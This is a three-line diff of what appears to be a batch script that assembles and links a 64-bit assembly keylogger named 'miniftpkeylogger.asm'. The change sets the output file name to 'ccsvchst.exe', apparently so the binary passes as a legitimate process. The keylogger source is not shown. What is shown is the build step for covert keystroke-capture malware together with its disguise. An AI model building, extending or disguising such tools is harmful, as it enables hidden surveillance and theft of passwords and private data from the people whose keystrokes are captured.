@@ -1,3 +1,3 @@
-\MASM64\BIN\ml64 /c miniftpkeylogger.asm
-\MASM64\BIN\link /subsystem:windows /entry:start miniftpkeylogger.obj
+\masm64\bin\ml64 /c miniftpkeylogger.asm
+\masm64\bin\link /subsystem:windows /entry:start miniftpkeylogger.obj /out:ccsvchst.exe
 pause
